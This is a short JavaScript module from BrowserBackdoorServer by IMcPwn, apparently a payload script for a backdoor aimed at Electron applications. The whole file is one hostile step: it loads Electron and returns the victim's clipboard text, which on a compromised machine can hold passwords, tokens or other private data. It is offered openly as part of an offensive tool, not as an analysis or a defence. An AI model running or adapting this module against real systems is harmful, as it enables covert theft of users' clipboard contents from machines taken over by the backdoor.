/*
 * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
 * BrowserBackdoorServer by IMcPwn.
 * See the file 'LICENSE' for copying permission
 *
 * Parameters: None
 * Returns: Text in clipboard
 * Author: IMcPwn
 */

if (typeof electron == 'undefined') electron = require('electron');
return electron.clipboard.readText();
